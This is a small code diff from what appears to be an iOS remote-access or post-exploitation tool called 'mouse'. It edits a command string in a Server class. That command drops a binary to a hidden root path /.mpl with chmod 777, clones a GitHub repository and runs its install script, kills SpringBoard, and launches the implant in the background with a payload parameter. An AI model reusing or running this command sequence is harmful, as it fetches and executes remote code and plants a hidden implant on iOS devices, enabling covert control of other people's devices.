@@ -152,7 +152,7 @@ class Server:
             "cat >/tmp/tmpmpl;"+\
             "chmod 777 /tmp/tmpmpl;"+\
             "mv /tmp/tmpmpl /.mpl;"+\
-            "rm -r mouse-substrate;"+\
+            "rm -r mouse;"+\
             "git clone https://github.com/entynetproject/mouse.git;"+\
             "cd mouse/substrate && chmod +x install.sh && ./install.sh && killall SpringBoard;"+\
             "/.mpl "+payload_parameter+" 2>/dev/null &\n"
